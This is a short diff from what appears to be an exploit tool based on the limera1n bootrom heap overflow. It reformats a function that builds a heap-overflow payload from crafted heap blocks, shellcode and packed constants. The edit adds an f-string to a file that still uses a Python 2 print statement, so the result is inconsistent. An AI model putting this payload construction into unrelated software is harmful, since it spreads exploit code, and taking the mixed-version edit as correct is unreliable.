@@ -168,7 +168,11 @@ def generate_payload(constants, exploit_lr):
 
     shellcode_address = 0x84000400 + 1
     heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 48)
-    return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
+    return (
+        heap_block * 16
+        + shellcode[:placeholders_offset]
+        + struct.pack(f'<{len(constants)}I', *constants)
+    )
 
 def exploit():
     print '*** based on limera1n exploit (heap overflow) by geohot ***'
